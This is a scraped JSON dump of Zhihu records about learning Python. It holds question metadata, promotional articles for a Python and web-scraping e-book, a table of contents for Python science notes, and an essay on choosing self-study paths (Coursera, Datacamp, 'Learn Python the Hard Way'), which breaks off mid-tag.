[{"question_title": "如何系统地自学 Python？", "question_url": "https://www.zhihu.com/question/29138020", "question_descr": "零基础情况下，想学一门语言。另 《Python 编程入门经典》这本书怎么样，是否值得看？", "question_id": 29138020, "answer_num": 213, "followers": 44244, "visitors": 3367185, "topics": "学习,Python,编程,计算机", "question_object_id": "e6f1048db775df6a5a2ac9bb2361d3fd", "answer_id_list": "428156754,81972368,72193349,141170242,394020225", "answer_url_list": "https://www.zhihu.com/question/29138020/answer/428156754,https://www.zhihu.com/question/29138020/answer/81972368,https://www.zhihu.com/question/29138020/answer/72193349,https://www.zhihu.com/question/29138020/answer/141170242,https://www.zhihu.com/question/29138020/answer/394020225"},{"question_title": "如何入门 Python 爬虫？", "question_url": "https://www.zhihu.com/question/20899988", "question_id": 20899988, "answer_num": 227, "followers": 50125, "visitors": 3346157, "topics": "Python,爬虫 (计算机网络)", "question_object_id": "cd4a4f69ab4bb77a1e850f01d28df94a", "answer_id_list": "24923424,58388759,165536870,96904827,255673324", "answer_url_list": "https://www.zhihu.com/question/20899988/answer/24923424,https://www.zhihu.com/question/20899988/answer/58388759,https://www.zhihu.com/question/20899988/answer/165536870,https://www.zhihu.com/question/20899988/answer/96904827,https://www.zhihu.com/question/20899988/answer/255673324"},{"zhuanlan_id": 20385885, "zhuanlan_url": "https://zhuanlan.zhihu.com/p/20385885", "zhuanlan_title": "25 岁才开始学习编程靠谱吗？40 岁都不晚！", "praise_num": 12247, "zhuanlan_article": "为什么要学编程？可能你有一个伟大的想法要实现，就差一个程序员了。可能你对现在的工作不满意，想在简历上多一个闪亮的加分项，或者干脆成为一个程序员。可能你只是想把自己从乏味的操作中解脱出来，体会一下电脑或手机的高级用法。总之，如果你想获得一种解决问题的能力，编程是个不错的选择。那么，为什么要选择 Python？下载本期周刊（编程小白学 Python），让熟悉多种编程语言的程序员、高频交易工程师和数据分析师们来告诉你 Python 的优势和强大之处吧！还有成功进阶的编程小白现身说法，为你呈现可选择的路。我毫不怀疑，99% 的人可以通过下载本期知乎周刊，获得一个有关编程和 Python 的「超级无敌」学习资料包。用不了多久你的网页收藏夹里就会堆满互联网上丰富的编程学习资源，你的购物车里也会多出几本待付款的经典教材，你甚至还会兴冲冲地跑去注册几门世界一流大学的在线课程。提前恭喜你，即将从「编程小白」成功蜕变为「准程序员」。然而，我更期待有超过 1% 的人，能够体会到本期周刊一直在强调的方法：以解决某个具体问题为出发点，直接上手一个小项目，在见招拆招的过程中提高学习的效率。至于「25 岁才开始学习编程靠谱吗？」这个问题，@CaunDerre 已经回答得很好了：种一棵树最好的时间是十年前，其次是现在。祝你学得开心！免费下载链接新刊直达：知乎往期下载：知乎周刊汇总本期目录专题·编程小白学 Python什么才算是真正的编程能力？｜@家飞猫编程入门指南｜@萧井陌｜@BadgerC 语言和 Python，该从哪个入门编程？｜@孙志岗Python 能做什么？｜@kula｜@谢科如何系统地自学 Python？｜@彭猫应该学习 Python 3 还是 Python 2？｜@林灿斌｜@adv adjPython 编程有哪些好习惯？｜@陈村不要问怎么入门，直接上路就好了｜@谢科｜@王月｜@代霸天数据分析哪家强？｜@周则禹｜@Twisted Python｜@peng wang｜@Lisa Lisa如何学习用 Python 分析数据？｜@质数｜@飞绝眷岭｜@SimonSQuant 也爱用 Python｜@袁浩瀚｜@用python的交易员成功范例：编程小白如何从 0 到 1｜ @杜志鹏成功范例：用 Python 找工作｜@蔡天雄Python 学习资源汇总｜@涛吴｜@彭泉鑫｜@Michael翔", "comments_num": 448, "zhuanlan_object_id": "e807a5fff52c338dea979b43510ed4c7"},{"zhuanlan_id": 28865834, "zhuanlan_url": "https://zhuanlan.zhihu.com/p/28865834", "zhuanlan_title": "一份Python爬虫电子书", "praise_num": 11257, "zhuanlan_article": "Python爬虫现如今已经越来越吃香了，随意打开一个招聘网站从薪资水平来看，入门的爬虫工程师都能拿到15k以上，爬虫架构相关的都能拿到30k以上，我们还有什么理由去拒绝爬虫呢？当然，除非你跟钱过意不去。&lt;img src=\"https://pic1.zhimg.com/v2-3f5716735908b4045d69fd4d10853654_b.jpg\" data-rawwidth=\"966\" data-rawheight=\"550\" class=\"origin_image zh-lightbox-thumb\" width=\"966\" data-original=\"https://pic1.zhimg.com/v2-3f5716735908b4045d69fd4d10853654_r.jpg\"&gt;所以秉着让更多想转行学习Python爬虫的的同学快速学习、让更多的小伙伴拿到高薪我整理了一份非常完善的Python爬虫的电子书。之前在知乎写分享已经有一年多，一直有朋友说我的回答和文章能整理成书籍了一直偷懒没做，也有出版社的小伙伴找我把这些内容做成书都被我拒绝了。所以也是借着这个机会仔细整理了知乎上的回答和文章另外也添加了一些新的内容，完成了几本小小的电子书，这一本比较小一部分是有关于Python方面的，主要内容还是Python爬虫。这本书主要内容是Python入门，以及Python爬虫入门和Python爬虫进阶，以下这是这本电子书的一个主要的目录：&lt;img src=\"https://pic2.zhimg.com/v2-00f6a6b05079b520c7f7f21013806d05_b.jpg\" data-rawwidth=\"589\" data-rawheight=\"435\" class=\"origin_image zh-lightbox-thumb\" width=\"589\" data-original=\"https://pic2.zhimg.com/v2-00f6a6b05079b520c7f7f21013806d05_r.jpg\"&gt;这本书除了一些自己的学习、面试感悟之外，还有很多包括书籍方面的资源、教程方面的学习资源，为了克服选择困难症，我在选择教程或者书籍的时候尽量保证了资源少但是精准，能用最少最精华的教程让大家快速入门Python以及比较熟悉的使用Python爬虫。如果你能用心用2-3个月的时间认真研读这本电子书，并且学习这本书上推荐的一些教程和书籍，相信你一定能找到一份不错的Python爬虫工作。你可以在微信公众号「一个程序员的日常」后台回复关键词「1」获取这本电子书！", "comments_num": 526, "zhuanlan_object_id": "34cd77de878e9271653ac1fa5fc32b56"},{"question_title": "Python 的练手项目有哪些值得推荐？", "question_url": "https://www.zhihu.com/question/29372574", "question_descr": "想用python重写一遍，不料我身边已经有同学捷足先登了，提前实现了，这即使我做完之后都不好意思在他面前装逼了，不知道各位还有没有发现别的不错的python项目，最好是综合性的，不要是网站，谢了，题主是一个计算机相关专业大三学生，有一定编程基础。", "question_id": 29372574, "answer_num": 97, "followers": 54682, "visitors": 2132242, "topics": "Python,编程,Python 入门", "question_object_id": "c181168a3221d8ce15f2a08eb37acf39", "answer_id_list": "88624507,88744491,192385626,346927368,44394791", "answer_url_list": "https://www.zhihu.com/question/29372574/answer/88624507,https://www.zhihu.com/question/29372574/answer/88744491,https://www.zhihu.com/question/29372574/answer/192385626,https://www.zhihu.com/question/29372574/answer/346927368,https://www.zhihu.com/question/29372574/answer/44394791"},{"question_title": "编程零基础应当如何开始学习 Python？", "question_url": "https://www.zhihu.com/question/20039623", "question_id": 20039623, "answer_num": 200, "followers": 34897, "visitors": 3043633, "topics": "编程语言,Python,如何学习 X", "question_object_id": "677d5f3e0f5777b949e653a8ea1e1358", "answer_id_list": "64926634,251224727,71077682,229969226,14621534", "answer_url_list": "https://www.zhihu.com/question/20039623/answer/64926634,https://www.zhihu.com/question/20039623/answer/251224727,https://www.zhihu.com/question/20039623/answer/71077682,https://www.zhihu.com/question/20039623/answer/229969226,https://www.zhihu.com/question/20039623/answer/14621534"},{"question_title": "一行代码可以做什么？", "question_url": "https://www.zhihu.com/question/285586045", "question_id": 285586045, "answer_num": 520, "followers": 6035, "visitors": 9030195, "topics": "Python,编程,计算机,代码,命令提示符 (cmd)", "question_object_id": "3897abf27c0ee2f0d0fefc9d172be150", "answer_id_list": "457806145,450054820,475364790,481988416,453517491,475593167,475255922,450569526,479403570,453251748", "answer_url_list": "https://www.zhihu.com/question/285586045/answer/457806145,https://www.zhihu.com/question/285586045/answer/450054820,https://www.zhihu.com/question/285586045/answer/475364790,https://www.zhihu.com/question/285586045/answer/481988416,https://www.zhihu.com/question/285586045/answer/453517491,https://www.zhihu.com/question/285586045/answer/475593167,https://www.zhihu.com/question/285586045/answer/475255922,https://www.zhihu.com/question/285586045/answer/450569526,https://www.zhihu.com/question/285586045/answer/479403570,https://www.zhihu.com/question/285586045/answer/453251748"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/81972368", "answer_id": 81972368, "comments_num": 370, "answer_article": "基于这个笔记的实体书了解一下？书名叫《自学Python——编程基础科学计算及数据分析》，将笔记的内容进行了系统整理，并补充了一些基础知识，可以对照两边的目录看差异。基于2.7。京东有自营。Python 其实挺简单的，也挺强大的。我用 Python 做科学计算，自学一年，也记了一年的笔记。笔记链接（基于Python 2.7）：Github：lijin-THU/notes-pythonNbviewer：Jupyter Notebook Viewer网页：lijin-thu.github.io 笔记目录：01. Python 工具01.01 Python 简介01.02 Ipython 解释器01.03 Ipython notebook01.04 使用 Anaconda02. Python 基础02.01 Python 入门演示02.02 Python 数据类型02.03 数字02.04 字符串02.05 索引和分片02.06 列表02.07 可变和不可变类型02.08 元组02.09 列表与元组的速度比较02.10 字典02.11 集合02.12 不可变集合02.13 Python 赋值机制02.14 判断语句02.15 循环02.16 列表推导式02.17 函数02.18 模块和包02.19 异常02.20 警告02.21 文件读写03. Numpy03.01 Numpy 简介03.02 Matplotlib 基础03.03 Numpy 数组及其索引03.04 数组类型03.05 数组方法03.06 数组排序03.07 数组形状03.08 对角线03.09 数组与字符串的转换03.10 数组属性方法总结03.11 生成数组的函数03.12 矩阵03.13 一般函数03.14 向量化函数03.15 二元运算03.16 ufunc 对象03.17 choose 函数实现条件筛选03.18 数组广播机制03.19 数组读写03.20 结构化数组03.21 记录数组03.22 内存映射03.23 从 Matlab 到 Numpy04. Scipy04.01 SCIentific PYthon 简介04.02 插值04.03 概率统计方法04.04 曲线拟合04.05 最小化函数04.06 积分04.07 解微分方程04.08 稀疏矩阵04.09 线性代数04.10 稀疏矩阵的线性代数05. Python 进阶05.01 sys 模块简介05.02 与操作系统进行交互：os 模块05.03 CSV 文件和 csv 模块05.04 正则表达式和 re 模块05.05 datetime 模块05.06 SQL 数据库05.07 对象关系映射05.08 函数进阶：参数传递，高阶函数，lambda 匿名函数，global 变量，递归05.09 迭代器05.10 生成器05.11 with 语句和上下文管理器05.12 修饰符05.13 修饰符的使用05.14 operator, functools, itertools, toolz, fn, funcy 模块05.15 作用域05.16 动态编译06. Matplotlib06.01 Pyplot 教程06.02 使用 style 来配置 pyplot 风格06.03 处理文本（基础）06.04 处理文本（数学表达式）06.05 图像基础06.06 注释06.07 标签06.08 figures, subplots, axes 和 ticks 对象06.09 不要迷信默认设置06.10 各种绘图实例07. 使用其他语言进行扩展07.01 简介07.02 Python 扩展模块07.03 Cython：Cython 基础，将源代码转换成扩展模块07.04 Cython：Cython 语法，调用其他C库07.05 Cython：class 和 cdef class，使用 C++07.06 Cython：Typed memoryviews07.07 生成编译注释07.08 ctypes08. 面向对象编程08.01 简介08.02 使用 OOP 对森林火灾建模08.03 什么是对象？08.04 定义 class08.05 特殊方法08.06 属性08.07 森林火灾模拟08.08 继承08.09 super() 函数08.10 重定义森林火灾模拟08.11 接口08.12 共有，私有和特殊方法和属性08.13 多重继承09. Theano 基础09.01 Theano 简介及其安装09.02 Theano 基础09.03 Theano 在 Windows 上的配置09.04 Theano 符号图结构09.05 Theano 配置和编译模式09.06 Theano 条件语句09.07 Theano 循环：scan（详解）09.08 Theano 实例：线性回归09.09 Theano 实例：Logistic 回归09.10 Theano 实例：Softmax 回归09.11 Theano 实例：人工神经网络09.12 Theano 随机数流变量09.13 Theano 实例：更复杂的网络09.14 Theano 实例：卷积神经网络09.15 Theano tensor 模块：基础09.16 Theano tensor 模块：索引09.17 Theano tensor 模块：操作符和逐元素操作09.18 Theano tensor 模块：nnet 子模块09.19 Theano tensor 模块：conv 子模块10. 有趣的第三方模块10.01 使用 basemap 画地图10.02 使用 cartopy 画地图10.03 探索 NBA 数据10.04 金庸的武侠世界11. 有用的工具11.01 pprint 模块：打印 Python 对象11.02 pickle, cPickle 模块：序列化 Python 对象11.03 json 模块：处理 JSON 数据11.04 glob 模块：文件模式匹配11.05 shutil 模块：高级文件操作11.06 gzip, zipfile, tarfile 模块：处理压缩文件11.07 logging 模块：记录日志11.08 string 模块：字符串处理11.09 collections 模块：更多数据结构11.10 requests 模块：HTTP for Human12. Pandas12.01 十分钟上手 Pandas12.02 一维数据结构：Series12.03 二维数据结构：DataFrame", "praise_num": 14066, "answer_object_id": "3cead32b9947acb356f273b9be396b6e"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/428156754", "answer_id": 428156754, "comments_num": 78, "answer_article": "如果你一直想学Python，但是不知道如何入手，那就别犹豫了。这篇文章就是为你写的。&lt;img src=\"https://pic3.zhimg.com/v2-1f8fa0d63c655bb201f1a691a6dcd316_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"422\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-6283f9d4996f9e54434547d5e8334e62_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"750\" data-original=\"https://pic3.zhimg.com/v2-1f8fa0d63c655bb201f1a691a6dcd316_r.jpg\"&gt;疑问随着数据科学概念的普及，Python这门并不算新的语言火得一塌糊涂。因为写了几篇用Python做数据分析的文章，经常有读者和学生在留言区问我，想学习Python，该如何入手？我经常需要根据他们的不同情况，提出对应的建议。这样针对性虽强，但效率不高。这个问题，我还是写出来，让更多的人一同看到吧。有几位出版社的编辑，给我发私信，鼓励我赶紧写一本Python教材出来。我暂时还没有写Python基础教程的计划。因为在我看来，现有的学习资源已经足够好了。有现成的资源和路径，为什么许多人依然在为学Python犯愁呢？因为学习有个效率问题。Python语法清晰明快，简单易学。这是Python如此普及的重要原因。但是，选择合适的Python学习方式，需要跟你自身的特性相结合。人群划分的标准是什么？不是你是否计算机相关专业，也不是你是否已经工作，而是一个重要的指标——你的自律能力。你可能觉得我说的话没有信息含量。自律能力强，学得更好，地球人谁不知道？可是，自律不够强的人，难道就注定什么也不能学了？当然不是。每个人的性格都有不同的特点，没有绝对的高下之分。不信你听听刘宝瑞先生的相声《日遭三险》，就明白了。&lt;img src=\"https://pic3.zhimg.com/v2-57c9cd9926ebc9ad5e901f9d15d7919a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"360\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-ec3ddaac80f94b7b2ac7694c3080e64d_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"480\" data-original=\"https://pic3.zhimg.com/v2-57c9cd9926ebc9ad5e901f9d15d7919a_r.jpg\"&gt;自律能力也是这样。只要你能清楚认识自己，就能以更高效的方法来学习新知识和技能。下面我们分类探讨一下，不同自律能力的人，该如何学Python，才能更高效。路径I咱们先从自律能力最差的人说起。这样的同学，往往是三分钟热度。偶然受到了刺激，发奋要学习Python，以便投入数据科学的事业中。他会立即跑到图书馆或者书店抱回来一本《X天从入门到精通Python》的书开始啃。结果X天还没到，就顺利跑完了从入门到放弃的全过程。你没能坚持下来，自己肯定是有责任的。但是最大的问题，在于过度高估自己的自律能力。这样的同学，我推荐你到Coursera平台上，按部就班学习一门非常好的MOOC——“Programming for Everybody”。&lt;img src=\"https://pic1.zhimg.com/v2-e92986c72c1f883654ea8305a8062ea0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-281d703529b1f9e732b1abbda0eabedc_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-e92986c72c1f883654ea8305a8062ea0_r.jpg\"&gt;推荐这门课，是因为课程质量真是太好了。首先是教材好。这本教材的来源是有故事的。先是 Allen B. Downey 写了一本开放书籍 “Think Python: How to Think like a Computer Scientist”。&lt;img src=\"https://pic4.zhimg.com/v2-4a272a4052e5b88542f993749ce92947_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"1627\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-cd01422a0daffd9b93f30532524cb3e0_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-4a272a4052e5b88542f993749ce92947_r.jpg\"&gt;这本书在Amazon上的评价是这样的：&lt;img src=\"https://pic1.zhimg.com/v2-7239beabb83c519567d50696dd501bfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"543\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-1188056834a477bc5767cb729a4ab315_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1070\" data-original=\"https://pic1.zhimg.com/v2-7239beabb83c519567d50696dd501bfc_r.jpg\"&gt;Charles Severance觉得这本书写得太好了，想把它作为教材。于是征得作者同意，大篇幅借鉴了这本书的内容架构，编写了一本 “Python for Informatics”。&lt;img src=\"https://pic3.zhimg.com/v2-8010603ed2e99b115396d0931a79f282_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"522\" data-rawheight=\"735\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-137f59ace3f554bf50c38eef00c0ee5b_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"522\" data-original=\"https://pic3.zhimg.com/v2-8010603ed2e99b115396d0931a79f282_r.jpg\"&gt;Charles写作这本书的时候，同时开放推出了iBook格式。里面就包含了自己的授课视频，供学生直接观看学习。&lt;img src=\"https://pic3.zhimg.com/v2-df0b9f0d509e14f451881000051a5a12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"508\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-facd534b10b3303d9cbbddf840e414f5_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-df0b9f0d509e14f451881000051a5a12_r.jpg\"&gt;后来，Charles用这本书扩展，做成了一门MOOC。2015年上线不久，硅谷资深工程师就都争相学习。Charles深谙课程迭代的技艺。他不断添加内容，完善课程体系，将一门课发展成一个专项课程(Signature Track)，并且将教材升级为 “Python for Everybody: Exploring Data In Python 3”&lt;img src=\"https://pic3.zhimg.com/v2-07e7940d3fc46f4e094262a5c1f1812e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"1767\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-9dea9cc94273cc2ed6e3fbe384e82b91_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-07e7940d3fc46f4e094262a5c1f1812e_r.jpg\"&gt;在目前全球MOOC口碑榜上，Charles的这门课一直名列前茅。&lt;img src=\"https://pic3.zhimg.com/v2-a9d39efeceacfd668e7bac0759eed28e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"887\" data-rawheight=\"130\" class=\"origin_image zh-lightbox-thumb\" width=\"887\" data-original=\"https://pic3.zhimg.com/v2-a9d39efeceacfd668e7bac0759eed28e_r.jpg\"&gt;这个专项课程深入浅出讲解Python本来就很简单的语法，而且还用数据科学的一些基础工作任务，带动你去使用Python语言写简单项目。这种扎实的训练过程可以增强你的信心，激发兴趣。对于自律程度低的同学来说，下面这个特性更重要——一切工作都有时限。Coursera上的课程，每周的任务很明确。练习题正确率如果不能达到80%，就不能过关。到了截止日期，如果你不能完成全部练习和课程项目，就拿不到证书。&lt;img src=\"https://pic4.zhimg.com/v2-4d088b454191767d083df89cc2c21d63_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"958\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-2c5bbd325d17d8a3b76d91e841fe06df_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-4d088b454191767d083df89cc2c21d63_r.jpg\"&gt;老师在前面引领你，助教在旁边督促你，平台用时间表提醒你，论坛上的同学们在用同侪压力推挤你……想偷懒？想三天打鱼两天晒网？很难。路径II如果你的自律能力中等偏上，那么你可以选择的面就宽了。这里我给你推荐另一个MOOC平台，叫做Datacamp。&lt;img src=\"https://pic3.zhimg.com/v2-20b8652fb6ec212e3a9a8f892f28eb4a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-dedce89e070f4b58673d16838e667506_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-20b8652fb6ec212e3a9a8f892f28eb4a_r.jpg\"&gt;我第一次接触Datacamp，是在2015年初。那时我在Coursera上选修杜克大学的统计学课程 “Statistical Inference”，配套的练习就在Datacamp上。当时这个平台就给我留下了非常深刻的印象，因为代码的运行都采用了云环境。学习者不需要在本机安装任何环境，一个支持HTML5标准的浏览器就能带给你完整的学习体验。对初学者来说，这种入门方式太好了。要知道，许多人的学习热情，就是被环境配置和依赖软件包安装的坑埋掉的。两年之后，Datacamp已经迭代得更为强大。你可以打开首页的Data Scientist with Python这个学习路径，查看其中已经提供的20门课程。&lt;img src=\"https://pic4.zhimg.com/v2-8c1c465991a4e3a502489cc385e828e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-0d06a165f915003c3e5fbc3d1eacb02c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-8c1c465991a4e3a502489cc385e828e7_r.jpg\"&gt;这些课程涵盖了从Python基础，到数据处理，直至人工智能和深度神经网络的方方面面。&lt;img src=\"https://pic1.zhimg.com/v2-23a769eaec6aa53c98b947361863fa3c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-9b5a6278fcb2fc838bd6626ddaed55cb_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-23a769eaec6aa53c98b947361863fa3c_r.jpg\"&gt;所有的课程设计，都是短小精悍的。一般不超过4个小时，就可以完成某一主题的学习。这样你学起来毫不费力，可以在相当短的时间内获得反馈（练习题自动评分）和成就感（证书）。这个平台的课程，进度完全由学习者自己掌控。所以我把它归纳为适合有一定自律能力的学习者。它既可以给你即时的回馈，让你时刻了解自己所处的位置进度，不会迷失方向，又能充分体验自主学习的乐趣。Datacamp的课程，一般都是第一部分免费开放。后面部分购买后才能解锁学习。如果你对自己的学习能力和毅力有信心，可以购买一个完整时间段（例如一年）的课程。在此期间，所有平台上的课程，你都可以学习，并且可以在通过后获取证书。这样的购买方案本身已经有优惠，而且每年都会有特定时段的大幅打折促销，非常划算。建议放到购物车里面多关注。&lt;img src=\"https://pic1.zhimg.com/v2-2a1e2b9ef3647ce55dba3c7add2c1be4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"858\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-c6cf71383a557fbb3b38a9f90df73154_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-2a1e2b9ef3647ce55dba3c7add2c1be4_r.jpg\"&gt;这是我在Datacamp拿到的深度学习框架Keras课程证书。确实只需要几个小时的时间就能学完。成就感还是蛮强的。路径III前面提到的课程费用不菲。Coursera上每门课平均价格在49美元左右。对来自发展中国家的学生群体，Coursera可以提供助学金。你可以根据自己的需求如实填写申请表，来获得资助。对于自律能力强的同学来说，你的选择可以变得非常简单直接——可以用最受推崇的教材，自己看书学习。最受推崇的教材，其实是没有的。正如西谚有云： One man’s meat, is another man’s poison.这个世界上，就没有哪件东西大家都说好。但口碑非常好的教材是存在的，例如这本起了个怪名字的《笨办法学Python》(Learn Python the Hard Way)。&lt;img src=\"https://pic4.zhimg.com/v2-994066342a47405ec4543c3145dbea4b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"782\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-940977fa21c50f377e140af9914b86c5_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic4.zhimg.com/v2-994066342a47405ec4543c3145dbea4b_r.jpg\"&gt;千万不要被名称迷惑，望文生义觉得这是一本糟糕的Python入门教程。恰恰相反，这本书的设计，非常适合人们的认知规律。我们学东西，由浅入深，由易到难，逐步递进。如果一味追求新知，那么之前学的东西会很快遗忘。如果总是原地打转，会带来枯燥和无聊的感觉。还记得高三做的那一年卷子吧？好的教科书，应该在每一个章节给学习者提供新的知识和内容，提出足够的挑战。但是挑战性不能高到让学习者产生挫败感而放弃。同时也不能忽视在后续内容中把前面所学知识改换面目不断螺旋上升式重复出现。只有这样才能巩固所学，让学习者感受到基础知识的作用，增强学习的愉悦感。这么说有些抽象，实际上有一本英语教材非常符合上述认知规律。就是我在课堂上和文章里反复推荐过的这一套教材：&lt;img src=\"https://pic3.zhimg.com/v2-60e5c4659a701db97ca0d219ec0daf1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"267\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-4ab9ef65bcebf922cd7d125ea9b7f758_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"450\" data-original=\"https://pic3.zhimg.com/v2-60e5c4659a701db97ca0d219ec0daf1e_r.jpg\"&gt;《笨办法学Python》也是一本这样的书。你需要做的就是把书打开，同时打开一个好用的代码编辑器，开始按书中要求敲代码、运行代码、改代码……下图是我当初学习时，照着这本书敲的代码。&lt;img src=\"https://pic4.zhimg.com/v2-a5c15ad2ad58154d52e32351313fdea7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"718\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-3961a4625b69b96b4cbf9e9e98a2850c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-a5c15ad2ad58154d52e32351313fdea7_r.jpg\"&gt;书中对Python基础内容训练的完备性，至今无出其右者。顺便说一句，这本书有中文版哦。所以如果你英语不好，完全不用担心。嘱咐一句，英语真该好好学。拓宽的不仅是你的眼界，也增加了你可能获得的机会。考虑到仔细阅读这部分的读者都是自律性很强的人，我就不用多说了。挑战三条基本的Python入门路径讲完了。通过对自己自律能力的清晰理解，相信你可以找到一种适合自己逐渐学习和掌握Python的方式。但是完成了读书和听课，是不是就完事大吉了？当然不是。许多人在这里犯了错误。他们以为拿到了证书，或学完了教材，就算是真正掌握了Python。然后把这门语言丢弃在一旁，去刷美剧和小说了。相信我，你会遗忘的。如果你对于长期不接触的东西从不遗忘……去医院检查一下吧。大部分人的记忆模式，都是这个样子的：&lt;img src=\"https://pic3.zhimg.com/v2-f1034d7fbfc65e1951745f8a45da1ef2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"674\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-77683f7c6f65bb5ba629b34e7074a060_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic3.zhimg.com/v2-f1034d7fbfc65e1951745f8a45da1ef2_r.jpg\"&gt;若不加以干涉，不出一个星期，你就能把学到的新知识几乎忘光。如果你不希望自己辛苦学来的Python知识被如此轻易浪费掉，怎么办？实践你应该实践。实践Python技能，未必一定要找个世界500强企业的核心技术部门，“996”工作N年才能完成。你可以从生活中寻找各种有趣的问题，然后思考能否用Python编程来解决它。我真正觉得自己初步掌握了Python，就是在完成了我的第一个github项目之后。项目非常简单，就是用Python作为胶水语言，把一系列工具连接在一起。可以把Markdown撰写的内容随心所欲一键变化成各种格式。格式包括而不限于：PDF/LaTeX;Word;Bitcron文稿;MarkEditor文稿；MWeb文稿；Bear文稿；TextBundle（可以导入MindNode, Ulysses等）;Reveal.js幻灯;发布版本Markdown（图片一键至七牛图床）;本地版本Markdown（简书等远程Markdown同步图片至本地)；Day One日记。其中部分功能我正陆续发布在github公开项目中，地址在这里。相应地，我也撰文做了介绍。&lt;img src=\"https://pic1.zhimg.com/v2-f05412bdd8ded40a8ac091094a4664c8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-1fd0d55755fd4c29a01b88be486b1b0a_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-f05412bdd8ded40a8ac091094a4664c8_r.jpg\"&gt;这个小项目，我从2014年开始做。实话实说，现在回头看当时的代码，简直惨不忍睹。但是如果你逐渐对自己的代码有了这种感觉，证明你在进步。不要指望自己一出手就能写出完美的代码，要把“迭代”两个字时刻装在心里。这样你才能容忍自己的笨拙，不断提高。正如古人说的那句： 勤学似春起之苗，不见其增，而日有所长。我在做这个项目的过程中，曾经遇到了中文编码、隐私信息存储、文件名空格处理、绝对与相对路径、发布流程划分、功能解耦合、Web图片地址附带参数……等等一系列的问题。&lt;img src=\"https://pic3.zhimg.com/v2-4e64f07e6430ae1c59feca04d38055b2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"783\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-28b2e82e8e33d1fb2b3978fd5c80e773_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" 